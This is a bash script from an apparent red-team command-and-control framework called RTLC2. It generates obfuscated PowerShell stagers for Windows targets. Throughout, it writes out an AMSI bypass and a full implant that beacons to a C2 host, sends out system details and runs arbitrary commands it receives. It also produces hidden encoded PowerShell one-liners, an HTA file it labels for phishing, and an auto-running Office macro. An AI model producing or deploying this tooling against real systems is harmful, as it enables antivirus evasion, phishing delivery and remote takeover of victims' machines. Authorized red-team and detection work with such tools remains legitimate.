#!/bin/bash
# =============================================================================
# RTLC2 PowerShell Stager Generator - Windows Target
# Generates obfuscated PowerShell stagers for agent delivery
# =============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
BUILD_DIR="$PROJECT_DIR/build"

banner() {
    echo -e "${RED}"
    echo "  ____  _____ _     ____ ____  "
    echo " |  _ \|_   _| |   / ___|___ \ "
    echo " | |_) | | | | |  | |     __) |"
    echo " |  _ <  | | | |__| |___ / __/ "
    echo " |_| \_\ |_| |____\____|_____|"
    echo -e "${NC}"
    echo -e "${CYAN} PowerShell Stager Generator${NC}"
    echo ""
}

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -h, --host HOST        C2 server host/IP"
    echo "  -k, --key KEY          AES master key (hex, from teamserver)"
    echo ""
    echo "Optional:"
    echo "  -p, --port PORT        C2 server port (default: 443)"
    echo "  -s, --sleep SECONDS    Sleep interval (default: 5)"
    echo "  -j, --jitter PERCENT   Jitter percentage 0-100 (default: 10)"
    echo "  -t, --tls              Enable TLS"
    echo "  --type TYPE            Stager type: download, inline, hta, macro (default: download)"
    echo "  --proxy PROXY          HTTP proxy URL (optional)"
    echo "  -o, --output FILE      Output filename"
    echo "  --encode               Base64 encode the final payload"
    echo "  --amsi-bypass          Include AMSI bypass (default: yes)"
    echo "  --no-amsi-bypass       Disable AMSI bypass"
    echo ""
    echo "Examples:"
    echo "  $0 -h 10.10.10.1 -p 443 -k abc123... -t"
    echo "  $0 -h c2.example.com -k abc123... --type hta -o stager.hta"
    echo "  $0 -h 192.168.1.100 -p 80 -k abc123... --type macro"
    echo ""
}

# Defaults
C2_HOST=""
C2_PORT=443
AES_KEY=""
SLEEP_INTERVAL=5
JITTER=10
USE_TLS=0
STAGER_TYPE="download"
PROXY=""
OUTPUT=""
ENCODE=0
AMSI_BYPASS=1

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--host) C2_HOST="$2"; shift 2;;
        -p|--port) C2_PORT="$2"; shift 2;;
        -k|--key) AES_KEY="$2"; shift 2;;
        -s|--sleep) SLEEP_INTERVAL="$2"; shift 2;;
        -j|--jitter) JITTER="$2"; shift 2;;
        -t|--tls) USE_TLS=1; shift;;
        --type) STAGER_TYPE="$2"; shift 2;;
        --proxy) PROXY="$2"; shift 2;;
        -o|--output) OUTPUT="$2"; shift 2;;
        --encode) ENCODE=1; shift;;
        --amsi-bypass) AMSI_BYPASS=1; shift;;
        --no-amsi-bypass) AMSI_BYPASS=0; shift;;
        --help) usage; exit 0;;
        *) echo -e "${RED}[!] Unknown option: $1${NC}"; usage; exit 1;;
    esac
done

banner

# Validate
if [[ -z "$C2_HOST" ]]; then
    echo -e "${RED}[!] Error: --host is required${NC}"
    usage
    exit 1
fi
if [[ -z "$AES_KEY" ]]; then
    echo -e "${RED}[!] Error: --key is required${NC}"
    usage
    exit 1
fi

# Protocol
SCHEME="http"
if [[ $USE_TLS -eq 1 ]]; then
    SCHEME="https"
fi
BASE_URL="${SCHEME}://${C2_HOST}:${C2_PORT}"

mkdir -p "$BUILD_DIR"

echo -e "${CYAN}[*] Configuration:${NC}"
echo -e "    C2 URL:     ${GREEN}$BASE_URL${NC}"
echo -e "    Sleep:      ${GREEN}${SLEEP_INTERVAL}s${NC}"
echo -e "    Jitter:     ${GREEN}${JITTER}%${NC}"
echo -e "    Type:       ${GREEN}$STAGER_TYPE${NC}"
echo -e "    AMSI:       ${GREEN}$([ $AMSI_BYPASS -eq 1 ] && echo 'bypass enabled' || echo 'disabled')${NC}"
echo ""

# ================================
# Generate PowerShell stager code
# ================================

generate_amsi_bypass() {
    # AMSI bypass using reflection
    cat << 'AMSI_EOF'
# AMSI context patching
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
if($b){[Runtime.InteropServices.Marshal]::WriteInt32($b.GetValue($null),0x41414141)}
AMSI_EOF
}

generate_core_agent_ps() {
    cat << CORE_EOF
# RTLC2 PowerShell Agent
# Auto-generated stager - do not modify

\$C2Host = "$C2_HOST"
\$C2Port = $C2_PORT
\$UseTLS = \$$([ $USE_TLS -eq 1 ] && echo 'true' || echo 'false')
\$SleepInterval = $SLEEP_INTERVAL
\$Jitter = $JITTER
\$AESKeyHex = "$AES_KEY"
\$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

\$scheme = if(\$UseTLS){"https"}else{"http"}
\$BaseURL = "\${scheme}://\${C2Host}:\${C2Port}"

# --- Crypto Functions ---
function ConvertFrom-HexString(\$hex) {
    \$bytes = New-Object byte[] (\$hex.Length / 2)
    for (\$i = 0; \$i -lt \$hex.Length; \$i += 2) {
        \$bytes[\$i / 2] = [Convert]::ToByte(\$hex.Substring(\$i, 2), 16)
    }
    return \$bytes
}

function Invoke-AESEncrypt(\$plaintext, \$keyHex) {
    \$key = ConvertFrom-HexString \$keyHex
    \$aes = [System.Security.Cryptography.AesGcm]::new(\$key)
    \$nonce = New-Object byte[] 12
    [System.Security.Cryptography.RandomNumberGenerator]::Fill(\$nonce)
    \$ct = New-Object byte[] \$plaintext.Length
    \$tag = New-Object byte[] 16
    \$aes.Encrypt(\$nonce, \$plaintext, \$ct, \$tag)
    \$aes.Dispose()
    return \$nonce + \$ct + \$tag
}

function Invoke-AESDecrypt(\$data, \$keyHex) {
    \$key = ConvertFrom-HexString \$keyHex
    \$nonce = \$data[0..11]
    \$tag = \$data[(\$data.Length-16)..(\$data.Length-1)]
    \$ct = \$data[12..(\$data.Length-17)]
    \$pt = New-Object byte[] \$ct.Length
    \$aes = [System.Security.Cryptography.AesGcm]::new(\$key)
    \$aes.Decrypt(\$nonce, \$ct, \$tag, \$pt)
    \$aes.Dispose()
    return \$pt
}

# --- HTTP Transport ---
function Send-Request(\$uri, \$body) {
    \$wc = New-Object System.Net.WebClient
    \$wc.Headers.Add("User-Agent", \$UserAgent)
    \$wc.Headers.Add("Content-Type", "application/octet-stream")
    $([ -n "$PROXY" ] && echo "\$wc.Proxy = New-Object System.Net.WebProxy('$PROXY')")
    if(\$UseTLS){[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}}
    try {
        return \$wc.UploadData("\$BaseURL\$uri", \$body)
    } catch {
        return \$null
    }
}

# --- System Info ---
function Get-SysInfo {
    \$info = @{
        hostname     = \$env:COMPUTERNAME
        username     = "\$env:USERDOMAIN\\\$env:USERNAME"
        os           = [System.Environment]::OSVersion.VersionString
        arch         = if([Environment]::Is64BitOperatingSystem){"x64"}else{"x86"}
        process_name = [System.Diagnostics.Process]::GetCurrentProcess().ProcessName
        pid          = \$PID
        internal_ip  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {\$_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress
        integrity    = if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){"high"}else{"medium"}
    }
    return (\$info | ConvertTo-Json -Compress)
}

# --- Agent Core ---
\$AgentID = ""
\$SessionKey = ""

function Register-Agent {
    \$sysinfo = Get-SysInfo
    \$encrypted = Invoke-AESEncrypt ([Text.Encoding]::UTF8.GetBytes(\$sysinfo)) \$AESKeyHex
    \$response = Send-Request "/register" \$encrypted
    if (\$null -eq \$response) { return \$false }

    \$decrypted = Invoke-AESDecrypt \$response \$AESKeyHex
    \$json = [Text.Encoding]::UTF8.GetString(\$decrypted) | ConvertFrom-Json
    \$script:AgentID = \$json.agent_id
    \$script:SessionKey = \$json.session_key
    return (\$AgentID.Length -gt 0)
}

function Invoke-Checkin(\$results) {
    \$checkin = @{ agent_id = \$AgentID }
    if (\$results.Count -gt 0) { \$checkin.results = \$results }
    \$json = \$checkin | ConvertTo-Json -Compress -Depth 5
    \$payload = Invoke-AESEncrypt ([Text.Encoding]::UTF8.GetBytes(\$json)) \$SessionKey

    # Prepend agent ID in plaintext (8 bytes)
    \$idBytes = [Text.Encoding]::UTF8.GetBytes(\$AgentID)
    \$sendData = \$idBytes + \$payload

    \$response = Send-Request "/checkin" \$sendData
    if (\$null -eq \$response -or \$response.Length -eq 0) { return @() }

    \$decrypted = Invoke-AESDecrypt \$response \$SessionKey
    \$taskJson = [Text.Encoding]::UTF8.GetString(\$decrypted) | ConvertFrom-Json
    return \$taskJson.tasks
}

function Invoke-Task(\$task) {
    \$result = @{ task_id = \$task.task_id; status = 2; output = "" }
    try {
        \$data = if(\$task.data){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$task.data))}else{""}
        switch (\$task.type) {
            1  { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Invoke-Expression \$data 2>&1 | Out-String))) }
            4  { \$script:SleepInterval = [int]\$data; \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Sleep set to \$data")) }
            5  { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Exiting")); \$script:Running = \$false }
            11 { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Process | Format-Table -AutoSize | Out-String))) }
            12 { \$path = if(\$data){\$data}else{"."}; \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem \$path | Format-Table -AutoSize | Out-String))) }
            13 { Set-Location \$data; \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Changed to \$data")) }
            14 { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Location).Path)) }
            15 { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami /all | Out-String))) }
            16 { \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((ipconfig /all | Out-String))) }
            default { \$result.status = 3; \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Unknown task type: \$(\$task.type)")) }
        }
    } catch {
        \$result.status = 3
        \$result.output = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\$_.Exception.Message))
    }
    return \$result
}

# --- Obfuscated Sleep ---
function Invoke-Sleep {
    \$base = \$SleepInterval * 1000
    \$jitterMs = [int](\$base * \$Jitter / 100)
    \$actual = \$base + (Get-Random -Minimum (-\$jitterMs) -Maximum \$jitterMs)
    if (\$actual -lt 100) { \$actual = 100 }
    # Use event wait instead of Start-Sleep for evasion
    \$event = [System.Threading.ManualResetEvent]::new(\$false)
    [void]\$event.WaitOne(\$actual)
    \$event.Dispose()
}

# --- Main Loop ---
\$Running = \$true

# Register
while (\$Running -and -not (Register-Agent)) {
    Invoke-Sleep
}

# Agent loop
while (\$Running) {
    \$results = @()
    try {
        \$tasks = Invoke-Checkin @()
        foreach (\$task in \$tasks) {
            \$taskResult = Invoke-Task \$task
            \$results += \$taskResult
        }
        if (\$results.Count -gt 0) {
            [void](Invoke-Checkin \$results)
        }
    } catch {}
    Invoke-Sleep
}
CORE_EOF
}

# ================================
# Generate stager based on type
# ================================

# Determine final output path (handle absolute vs relative -o)
resolve_output() {
    local name="$1"
    if [[ -z "$OUTPUT" ]]; then OUTPUT="$name"; fi
    if [[ "$OUTPUT" == /* ]]; then
        FINAL_OUTPUT="$OUTPUT"
    else
        FINAL_OUTPUT="$BUILD_DIR/$OUTPUT"
    fi
}

case "$STAGER_TYPE" in
    download)
        # Download cradle - downloads and executes the agent
        resolve_output "stager.ps1"
        echo -e "${CYAN}[*] Generating download cradle stager...${NC}"

        {
            echo "# RTLC2 PowerShell Download Stager"
            echo "# Target: $BASE_URL"
            echo "# Generated: $(date -u)"
            echo ""
            if [[ $AMSI_BYPASS -eq 1 ]]; then
                generate_amsi_bypass
                echo ""
            fi
            generate_core_agent_ps
        } > "$FINAL_OUTPUT"
        ;;

    inline)
        # Single-line encoded command
        resolve_output "stager_oneliner.txt"
        echo -e "${CYAN}[*] Generating inline (one-liner) stager...${NC}"

        PAYLOAD=$(generate_core_agent_ps)
        if [[ $AMSI_BYPASS -eq 1 ]]; then
            BYPASS=$(generate_amsi_bypass)
            PAYLOAD="${BYPASS}${PAYLOAD}"
        fi

        ENCODED=$(echo "$PAYLOAD" | iconv -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')
        echo "powershell -nop -w hidden -enc $ENCODED" > "$FINAL_OUTPUT"
        ;;

    hta)
        # HTA file for phishing
        resolve_output "stager.hta"
        echo -e "${CYAN}[*] Generating HTA stager...${NC}"

        PAYLOAD=$(generate_core_agent_ps)
        if [[ $AMSI_BYPASS -eq 1 ]]; then
            BYPASS=$(generate_amsi_bypass)
            PAYLOAD="${BYPASS}${PAYLOAD}"
        fi

        ENCODED=$(echo "$PAYLOAD" | iconv -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')

        cat > "$FINAL_OUTPUT" << HTA_EOF
<html>
<head>
<script language="VBScript">
Sub Window_OnLoad
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -nop -w hidden -enc $ENCODED", 0, False
    window.close
End Sub
</script>
</head>
<body>
<p>Loading document...</p>
</body>
</html>
HTA_EOF
        ;;

    macro)
        # VBA Macro for Office documents
        resolve_output "stager_macro.vba"
        echo -e "${CYAN}[*] Generating VBA macro stager...${NC}"

        PAYLOAD=$(generate_core_agent_ps)
        if [[ $AMSI_BYPASS -eq 1 ]]; then
            BYPASS=$(generate_amsi_bypass)
            PAYLOAD="${BYPASS}${PAYLOAD}"
        fi

        ENCODED=$(echo "$PAYLOAD" | iconv -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')

        # Split encoded payload into VBA string chunks (max 200 chars per line)
        {
            echo "' RTLC2 VBA Macro Stager"
            echo "' Target: $BASE_URL"
            echo "' Paste this into a macro-enabled Office document"
            echo ""
            echo "Sub AutoOpen()"
            echo "    Dim cmd As String"

            # Split into chunks
            CHUNK_SIZE=200
            TOTAL=${#ENCODED}
            i=0
            first=1
            while [ $i -lt $TOTAL ]; do
                CHUNK="${ENCODED:$i:$CHUNK_SIZE}"
                if [ $first -eq 1 ]; then
                    echo "    cmd = \"$CHUNK\""
                    first=0
                else
                    echo "    cmd = cmd & \"$CHUNK\""
                fi
                i=$((i + CHUNK_SIZE))
            done

            echo "    Dim objShell As Object"
            echo "    Set objShell = CreateObject(\"Wscript.Shell\")"
            echo "    objShell.Run \"powershell -nop -w hidden -enc \" & cmd, 0, False"
            echo "End Sub"
        } > "$FINAL_OUTPUT"
        ;;

    *)
        echo -e "${RED}[!] Unknown stager type: $STAGER_TYPE${NC}"
        echo "    Valid types: download, inline, hta, macro"
        exit 1
        ;;
esac

# Encode final output if requested
if [[ $ENCODE -eq 1 && "$STAGER_TYPE" == "download" ]]; then
    base64 < "$FINAL_OUTPUT" > "${FINAL_OUTPUT}.b64"
    echo -e "${GREEN}[+] Base64 encoded: ${FINAL_OUTPUT}.b64${NC}"
fi

echo ""
echo -e "${GREEN}[+] Stager generated: $FINAL_OUTPUT${NC}"
echo -e "    Size: $(du -h "$FINAL_OUTPUT" | cut -f1)"
echo -e "    SHA256: $(shasum -a 256 "$FINAL_OUTPUT" 2>/dev/null | cut -d' ' -f1)"
echo ""
echo -e "${GREEN}[+] Done!${NC}"
